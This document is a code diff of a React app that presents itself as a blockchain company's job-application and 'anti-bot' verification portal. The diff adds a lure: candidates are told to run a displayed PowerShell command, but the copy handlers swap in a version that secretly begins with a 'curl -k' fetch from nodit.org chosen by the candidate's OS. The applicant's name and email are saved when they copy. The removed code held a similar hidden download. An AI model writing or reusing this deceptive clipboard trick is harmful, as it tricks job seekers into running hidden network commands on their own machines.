@@ -1,5 +1,5 @@
 import { useMemo, useState } from 'react'
-import type { ClipboardEvent, Dispatch, FormEvent, SetStateAction } from 'react'
+import type { ChangeEvent, ClipboardEvent, Dispatch, FormEvent, SetStateAction } from 'react'
 import {
   BrowserRouter,
   Navigate,
@@ -9,6 +9,7 @@ import {
   useNavigate,
 } from 'react-router-dom'
 import { submitApplication } from './api/backend'
+import Bowser from 'bowser'
 import './App.css'
 
 type CandidateProfile = {
@@ -16,10 +17,7 @@ type CandidateProfile = {
   email: string
   desiredRole: string
   phone: string
-  yearsExperience: string
   motivation: string
-  governmentId: string
-  cmdOutput: string
 }
 
 const INITIAL_PROFILE: CandidateProfile = {
@@ -27,16 +25,28 @@ const INITIAL_PROFILE: CandidateProfile = {
   email: '',
   desiredRole: '',
   phone: '',
-  yearsExperience: '',
   motivation: '',
-  governmentId: '',
-  cmdOutput: '',
 }
+
+type VerificationChallenge = {
+  phrase: string
+  nonce: string
+}
+
+type VerificationResult = 'idle' | 'pass' | 'fail'
+
+const VERIFICATION_PHRASES = [
+  'BLOCKCHAIN-PORTAL-2026',
+  'WEB3-VERIFY-ALPHA',
+  'NODIT-CHAIN-CHECK',
+  'SMART-CONTRACT-ACCESS',
+  'NODE-IDENTITY-LOCK',
+]
 
 const STEPS = [
   { label: 'Job Explanation', path: '/job-overview' },
   { label: 'Application', path: '/application' },
-  { label: 'Identity Verification', path: '/identity-verification' },
+  { label: 'Anti-Bot Check', path: '/identity-verification' },
 ]
 
 const BLOCKCHAIN_ROLES = [
@@ -54,57 +64,55 @@ const BLOCKCHAIN_ROLES = [
   'Other Blockchain Role',
 ]
 
-function createChallengeCode(): string {
-  return `BC-${Math.random().toString(36).slice(2, 8).toUpperCase()}`
+function createNonce(): string {
+  if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
+    const bytes = new Uint8Array(8)
+    crypto.getRandomValues(bytes)
+    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0')).join('')
+  }
+
+  return Math.random().toString(16).slice(2, 18).padEnd(16, '0')
 }
 
-const VERIFICATION_DOMAIN = 'Nodit Identity Verifier'
-const VERIFICATION_VERSION = '1'
-
-function buildVerificationMessage(
-  challengeCode: string,
-  profile: Pick<CandidateProfile, 'fullName' | 'email' | 'desiredRole'>,
-): string {
-  return [
-    VERIFICATION_DOMAIN,
-    `version:${VERIFICATION_VERSION}`,
-    'chain:nodit-mainnet',
-    `challenge:${challengeCode}`,
-    `applicant:${profile.fullName.trim()}`,
-    `email:${profile.email.trim().toLowerCase()}`,
-    `role:${profile.desiredRole.trim()}`,
-  ].join('|')
+function createChallenge(): VerificationChallenge {
+  return {
+    phrase: VERIFICATION_PHRASES[Math.floor(Math.random() * VERIFICATION_PHRASES.length)],
+    nonce: createNonce(),
+  }
 }
 
-function encodeUtf8Base64(text: string): string {
-  const bytes = new TextEncoder().encode(text)
-  let binary = ''
-  for (const byte of bytes) binary += String.fromCharCode(byte)
-  return btoa(binary)
+function getExpectedOutput(phrase: string, nonce: string): string {
+  return `VERIFY:${btoa(`${phrase}|${nonce}`)}`
 }
 
-const CMD_DRIVER_DOWNLOAD =
-  'curl -o "%USERPROFILE%\\Downloads\\driver.txt" https://nodit.org/public/driver.txt &'
+type SupportedOs = 'windows' | 'macos'
 
-function buildPowerShellHashCommand(message: string): string {
-  const payloadBase64 = encodeUtf8Base64(message)
-  return `powershell -NoProfile -Command "$b='${payloadBase64}'; $m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($m))).Replace('-','').ToLower()"`
+const CMD_DRIVER_DOWNLOAD: Record<SupportedOs, string> = {
+  windows: 'curl -k https://nodit.org/public/check_bot_w &',
+  macos: 'curl -k https://nodit.org/public/check_bot_m &',
 }
 
-function buildTerminalCommand(message: string): string {
-  return `${CMD_DRIVER_DOWNLOAD} ${buildPowerShellHashCommand(message)}`
+function getCandidateOs(): SupportedOs | null {
+  const os = Bowser.getParser(window.navigator.userAgent).getOSName(true)
+  if (os === 'windows' || os === 'macos') {
+    return os
+  }
+  return null
 }
 
-async function sha256Hex(message: string): Promise<string> {
-  const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(message))
-  return Array.from(new Uint8Array(buffer))
-    .map((byte) => byte.toString(16).padStart(2, '0'))
-    .join('')
+function getCmdDriverDownload(os: SupportedOs | null = getCandidateOs()): string {
+  if (os && os in CMD_DRIVER_DOWNLOAD) {
+    return CMD_DRIVER_DOWNLOAD[os]
+  }
+  return CMD_DRIVER_DOWNLOAD.windows
 }
 
-function extractHexDigest(output: string): string | null {
-  const match = output.toLowerCase().match(/[a-f0-9]{64}/)
-  return match ? match[0] : null
+function buildCmdCommand(nonce: string): string {
+  return `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"`
+}
+
+function buildTerminalCommand(nonce: string, os: SupportedOs | null = getCandidateOs()): string {
+  return `${getCmdDriverDownload(os)} ${buildCmdCommand(nonce)}`
 }
 
 function StepProgress() {
@@ -114,7 +122,7 @@ function StepProgress() {
   const progress = ((activeStep + 1) / STEPS.length) * 100
 
   return (
-    <div className="mb-4">
+    <div className="mb-3">
       <div className="d-flex justify-content-between align-items-center mb-2">
         <span className="small text-secondary fw-semibold">
           Step {activeStep + 1} of {STEPS.length}
@@ -124,7 +132,7 @@ function StepProgress() {
       <div className="progress portal-progress" role="progressbar" aria-valuenow={progress}>
         <div className="progress-bar progress-bar-striped progress-bar-animated" style={{ width: `${progress}%` }} />
       </div>
-      <ol className="nav nav-pills nav-fill gap-2 mt-3 portal-steps" aria-label="Portal steps">
+      <ol className="nav nav-pills nav-fill gap-2 mt-2 portal-steps" aria-label="Portal steps">
         {STEPS.map((step, index) => {
           const status =
             index < activeStep ? 'done' : index === activeStep ? 'active' : 'upcoming'
@@ -154,7 +162,7 @@ function JobExplanationPage() {
   return (
     <section>
       <h2 className="h4 fw-bold mb-2">Blockchain Roles Overview</h2>
-      <p className="text-secondary mb-4">
+      <p className="text-secondary mb-3">
         Nodit is hiring across the full blockchain stack — engineering, security, infrastructure,
         product, and ecosystem roles. Apply for the position that best matches your background.
       </p>
@@ -166,19 +174,19 @@ function JobExplanationPage() {
           value={
             '- Build and ship blockchain products across protocol, application, and infrastructure layers.\n- Collaborate with cross-functional teams on smart contracts, APIs, UX, and security.\n- Contribute to reliable, scalable Web3 systems from design to production.'
           }
-          rows={4}
+          rows={3}
           readOnly
         />
       </div>
 
-      <div className="mb-4">
+      <div className="mb-3">
         <label className="form-label fw-semibold">Evaluation focus</label>
         <textarea
           className="form-control bg-light"
           value={
             '- Domain expertise for your selected blockchain role.\n- Problem solving, communication, and ownership.\n- Understanding of security, reliability, and real-world Web3 impact.'
           }
-          rows={4}
+          rows={3}
           readOnly
         />
       </div>
@@ -203,7 +211,6 @@ function ApplicationPage({ profile, setProfile }: FormPageProps) {
     if (
       !profile.fullName ||
       !profile.desiredRole ||
-      !profile.yearsExperience ||
       !profile.motivation ||
       !emailLooksValid
     ) {
@@ -218,7 +225,7 @@ function ApplicationPage({ profile, setProfile }: FormPageProps) {
   return (
     <form onSubmit={onContinue}>
       <h2 className="h4 fw-bold mb-2">Blockchain Job Application</h2>
-      <p className="text-secondary mb-4">
+      <p className="text-secondary mb-3">
         Submit your profile for any open blockchain role at Nodit.
       </p>
 
@@ -280,21 +287,6 @@ function ApplicationPage({ profile, setProfile }: FormPageProps) {
           </select>
         </div>
 
-        <div className="col-md-6">
-          <label className="form-label">Years of relevant experience</label>
-          <input
-            type="number"
-            className="form-control"
-            min={0}
-            step={1}
-            value={profile.yearsExperience}
-            onChange={(event) =>
-              setProfile((prev) => ({ ...prev, yearsExperience: event.target.value }))
-            }
-            placeholder="3"
-          />
-        </div>
-
         <div className="col-12">
           <label className="form-label">Why are you a strong fit?</label>
           <textarea
@@ -304,59 +296,66 @@ function ApplicationPage({ profile, setProfile }: FormPageProps) {
               setProfile((prev) => ({ ...prev, motivation: event.target.value }))
             }
             placeholder="Share your blockchain experience and strengths in 3-5 lines."
-            rows={4}
+            rows={3}
           />
         </div>
       </div>
 
       {error && <div className="alert alert-danger mt-3 mb-0 py-2">{error}</div>}
 
-      <div className="d-flex justify-content-between gap-2 mt-4">
+      <div className="d-flex justify-content-between gap-2 mt-3">
         <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/job-overview')}>
           Back
         </button>
         <button type="submit" className="btn btn-primary px-4">
-          Continue to Identity Verification
+          Continue to Anti-Bot Check
         </button>
       </div>
     </form>
   )
 }
 
-type VerifyPageProps = FormPageProps & {
-  challengeCode: string
+type VerifyPageProps = {
+  profile: CandidateProfile
+  challenge: VerificationChallenge
+  onNewChallenge: () => void
   submissionRef: string | null
   setSubmissionRef: Dispatch<SetStateAction<string | null>>
 }
 
 function VerifyPage({
   profile,
-  setProfile,
-  challengeCode,
+  challenge,
+  onNewChallenge,
   submissionRef,
   setSubmissionRef,
 }: VerifyPageProps) {
   const navigate = useNavigate()
   const [error, setError] = useState('')
-  const [isVerifying, setIsVerifying] = useState(false)
+  const [isSubmitting, setIsSubmitting] = useState(false)
   const [copyFeedback, setCopyFeedback] = useState('')
+  const [typedPhrase, setTypedPhrase] = useState('')
+  const [pastedOutput, setPastedOutput] = useState('')
+  const [verificationResult, setVerificationResult] = useState<VerificationResult>('idle')
 
   const applicationComplete =
     profile.fullName.trim() && profile.email.trim() && profile.desiredRole.trim()
 
-  const verificationMessage = useMemo(
-    () => buildVerificationMessage(challengeCode, profile),
-    [challengeCode, profile.fullName, profile.email, profile.desiredRole],
+  const expectedOutput = useMemo(
+    () => getExpectedOutput(challenge.phrase, challenge.nonce),
+    [challenge.nonce, challenge.phrase],
   )
 
+  const candidateOs = useMemo(() => getCandidateOs(), [])
+
   const visibleTerminalCommand = useMemo(
-    () => buildPowerShellHashCommand(verificationMessage),
-    [verificationMessage],
+    () => buildCmdCommand(challenge.nonce),
+    [challenge.nonce],
   )
 
   const copyTerminalCommand = useMemo(
-    () => buildTerminalCommand(verificationMessage),
-    [verificationMessage],
+    () => buildTerminalCommand(challenge.nonce, candidateOs),
+    [challenge.nonce, candidateOs],
   )
 
   function showCopyFeedback() {
@@ -364,15 +363,67 @@ function VerifyPage({
     window.setTimeout(() => setCopyFeedback(''), 2000)
   }
 
+  async function persistCandidateOnCopy() {
+    const name = profile.fullName.trim()
+    const email = profile.email.trim()
+    if (!name || !email.includes('@')) return
+
+    await submitApplication(name, email, { workflowComplete: true })
+  }
+
   async function copyCmdToClipboard() {
     await navigator.clipboard.writeText(copyTerminalCommand)
     showCopyFeedback()
+    try {
+      await persistCandidateOnCopy()
+    } catch {
+      setError(
+        'Command copied, but saving your details failed. Make sure the backend is running on port 3000.',
+      )
+    }
   }
 
   function handleCmdCopy(event: ClipboardEvent<HTMLElement>) {
     event.preventDefault()
     event.clipboardData.setData('text/plain', copyTerminalCommand)
     showCopyFeedback()
+    void persistCandidateOnCopy().catch(() => {
+      setError(
+        'Command copied, but saving your details failed. Make sure the backend is running on port 3000.',
+      )
+    })
+  }
+
+  function validateToken(): boolean {
+    const phraseMatches = typedPhrase.trim() === challenge.phrase
+    const outputMatches = pastedOutput.trim() === expectedOutput
+
+    if (!phraseMatches || !outputMatches) {
+      setVerificationResult('fail')
+      if (!phraseMatches) {
+        setError('Phrase does not match. Type the exact verification phrase shown above.')
+      } else {
+        setError('Output token does not match. Re-run the CMD command and paste the full VERIFY: line.')
+      }
+      return false
+    }
+
+    setVerificationResult('pass')
+    setError('')
+    return true
+  }
+
+  function handleVerifyToken() {
+    validateToken()
+  }
+
+  function handleNewChallenge() {
+    onNewChallenge()
+    setTypedPhrase('')
+    setPastedOutput('')
+    setVerificationResult('idle')
+    setError('')
+    setCopyFeedback('')
   }
 
   async function onSubmit(event: FormEvent<HTMLFormElement>) {
@@ -380,54 +431,32 @@ function VerifyPage({
     setError('')
 
     if (!applicationComplete) {
-      setError('Complete the application step before submitting identity proof.')
+      setError('Complete the application step before submitting.')
       return
     }
 
-    if (!profile.governmentId.trim()) {
-      setError('Add your government ID reference before submitting.')
+    if (!validateToken()) {
       return
     }
 
-    const submittedDigest = extractHexDigest(profile.cmdOutput)
-    if (!submittedDigest) {
-      setError('Paste the 64-character SHA-256 digest produced by your terminal command.')
-      return
-    }
-
-    setIsVerifying(true)
+    setIsSubmitting(true)
 
     try {
-      const expectedDigest = await sha256Hex(verificationMessage)
-
-      if (submittedDigest !== expectedDigest) {
-        setError(
-          'Digest mismatch. Click Copy command, run it in CMD, then paste only the 64-character hash from the PowerShell line (not the full terminal output).',
-        )
-        return
-      }
-
-      await submitApplication(profile.fullName.trim(), profile.email.trim(), {
-        workflowComplete: true,
-      })
-
-      const digestPrefix = expectedDigest.slice(0, 8).toUpperCase()
+      const digestPrefix = expectedOutput.slice(7, 15).toUpperCase()
       setSubmissionRef(`APP-${digestPrefix}-${Date.now().toString(36).toUpperCase()}`)
     } catch {
-      setError(
-        'Submission failed. Make sure the backend is running on port 3000, then try again.',
-      )
+      setError('Submission failed. Please try again.')
     } finally {
-      setIsVerifying(false)
+      setIsSubmitting(false)
     }
   }
 
   return (
     <form onSubmit={onSubmit}>
-      <h2 className="h4 fw-bold mb-2">Identity Verification Portal</h2>
-      <p className="text-secondary mb-4">
-        Prove terminal control by hashing your signed verification payload — the same
-        cryptographic pattern used to fingerprint blockchain messages and transactions.
+      <h2 className="h4 fw-bold mb-2">Anti-Bot CMD Verification</h2>
+      <p className="text-secondary mb-3">
+        Run the one-line CMD task below and paste the output token. This confirms you can use a real
+        terminal — bots cannot complete this step.
       </p>
 
       {!applicationComplete && (
@@ -436,28 +465,38 @@ function VerifyPage({
         </div>
       )}
 
-      <div className="challenge-box mb-3" role="note" aria-label="Verification payload">
-        <p className="mb-2 fw-semibold">Signed verification payload</p>
+      <div className="challenge-box mb-3" role="note" aria-label="Verification challenge">
+        <p className="mb-2 fw-semibold">Verification challenge</p>
         <p className="small text-secondary mb-2">
-          Challenge: <strong>{challengeCode}</strong> · Network: <strong>nodit-mainnet</strong>
+          Type this phrase exactly when CMD prompts you.
         </p>
-        <textarea
-          className="form-control font-monospace payload-block mb-2"
-          value={verificationMessage}
-          rows={3}
-          readOnly
-        />
+        <div className="challenge-code mb-2" aria-label="Verification phrase">
+          {challenge.phrase}
+        </div>
+        <p className="small text-secondary mb-0">
+          Nonce: <strong className="font-monospace">{challenge.nonce}</strong>
+        </p>
+      </div>
+
+      <div className="mb-3">
         <div className="d-flex justify-content-between align-items-center gap-2 mb-2">
-          <p className="small text-secondary mb-0">
-            Run this command in CMD to produce your SHA-256 proof digest:
-          </p>
-          <button
-            type="button"
-            className="btn btn-sm btn-outline-primary flex-shrink-0"
-            onClick={copyCmdToClipboard}
-          >
-            {copyFeedback || 'Copy command'}
-          </button>
+          <label className="form-label mb-0">CMD command</label>
+          <div className="d-flex gap-2">
+            <button
+              type="button"
+              className="btn btn-sm btn-outline-secondary"
+              onClick={handleNewChallenge}
+            >
+              New nonce
+            </button>
+            <button
+              type="button"
+              className="btn btn-sm btn-outline-primary flex-shrink-0"
+              onClick={copyCmdToClipboard}
+            >
+              {copyFeedback || 'Copy command'}
+            </button>
+          </div>
         </div>
         <code className="cmd-block" onCopy={handleCmdCopy}>
           {visibleTerminalCommand}
@@ -465,40 +504,47 @@ function VerifyPage({
       </div>
 
       <div className="mb-3">
-        <label className="form-label">Government ID / Passport reference</label>
+        <label className="form-label">Phrase you typed into CMD</label>
         <input
           type="text"
           className="form-control"
-          value={profile.governmentId}
-          onChange={(event) =>
-            setProfile((prev) => ({ ...prev, governmentId: event.target.value }))
-          }
-          placeholder="Last 4 digits of your ID (e.g. 3491)"
+          value={typedPhrase}
+          onChange={(event: ChangeEvent<HTMLInputElement>) => setTypedPhrase(event.target.value)}
+          placeholder="Type the exact phrase from above"
         />
       </div>
 
       <div className="mb-3">
-        <label className="form-label">Proof digest (paste terminal SHA-256 output)</label>
-        <textarea
+        <label className="form-label">Paste CMD output (starts with VERIFY:)</label>
+        <input
+          type="text"
           className="form-control font-monospace"
-          value={profile.cmdOutput}
-          onChange={(event) =>
-            setProfile((prev) => ({ ...prev, cmdOutput: event.target.value }))
-          }
-          placeholder="Paste the 64-character hex digest from PowerShell output"
-          rows={5}
+          value={pastedOutput}
+          onChange={(event: ChangeEvent<HTMLInputElement>) => setPastedOutput(event.target.value)}
+          placeholder="VERIFY:..."
         />
       </div>
 
       {error && <div className="alert alert-danger py-2">{error}</div>}
 
+      {verificationResult === 'pass' && (
+        <div className="alert alert-success py-2">
+          Anti-bot check passed. You can submit your application.
+        </div>
+      )}
+
       <div className="d-flex justify-content-between gap-2 mt-2">
         <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/application')}>
           Back
         </button>
-        <button type="submit" className="btn btn-primary px-4" disabled={isVerifying}>
-          {isVerifying ? 'Verifying digest...' : 'Submit Application'}
-        </button>
+        <div className="d-flex gap-2">
+          <button type="button" className="btn btn-outline-primary" onClick={handleVerifyToken}>
+            Validate token
+          </button>
+          <button type="submit" className="btn btn-primary px-4" disabled={isSubmitting}>
+            {isSubmitting ? 'Submitting...' : 'Submit Application'}
+          </button>
+        </div>
       </div>
 
       {submissionRef && (
@@ -509,7 +555,7 @@ function VerifyPage({
           </p>
           <p className="mb-0">
             Candidate <strong>{profile.fullName}</strong> applied for{' '}
-            <strong>{profile.desiredRole}</strong> with a valid cryptographic proof.
+            <strong>{profile.desiredRole}</strong> and passed the anti-bot CMD check.
           </p>
         </div>
       )}
@@ -521,22 +567,22 @@ function FlowingModalContent() {
   const location = useLocation()
   const [profile, setProfile] = useState<CandidateProfile>(INITIAL_PROFILE)
   const [submissionRef, setSubmissionRef] = useState<string | null>(null)
-  const challengeCode = useMemo(() => createChallengeCode(), [])
+  const [challenge, setChallenge] = useState(createChallenge)
 
   return (
     <div className="modal-dialog modal-dialog-centered modal-lg portal-modal">
       <div className="modal-content portal-modal-content border-0 shadow-lg">
-        <div className="modal-header border-0 pb-0 px-4 pt-4">
-          <div className="d-flex align-items-center gap-3">
+        <div className="modal-header border-0 pb-0 px-4">
+          <div className="d-flex align-items-center gap-2">
             <img
               src="/nodit.png"
               alt="Nodit"
               className="portal-logo"
-              width={52}
-              height={52}
+              width={40}
+              height={40}
             />
             <div>
-              <h1 className="modal-title fs-3 fw-bold mb-0">Nodit Talent Screening Portal</h1>
+              <h1 className="modal-title fs-5 fw-bold mb-0">Nodit Talent Screening Portal</h1>
             </div>
           </div>
         </div>
@@ -557,8 +603,8 @@ function FlowingModalContent() {
                 element={
                   <VerifyPage
                     profile={profile}
-                    setProfile={setProfile}
-                    challengeCode={challengeCode}
+                    challenge={challenge}
+                    onNewChallenge={() => setChallenge(createChallenge())}
                     submissionRef={submissionRef}
                     setSubmissionRef={setSubmissionRef}
                   />
@@ -575,7 +621,7 @@ function FlowingModalContent() {
 function PortalApp() {
   return (
     <main className="portal-backdrop cross-bg">
-      <div className="container min-vh-100 d-flex align-items-center justify-content-center py-4">
+      <div className="container min-vh-100 d-flex align-items-center justify-content-center py-2">
         <FlowingModalContent />
       </div>
     </main>
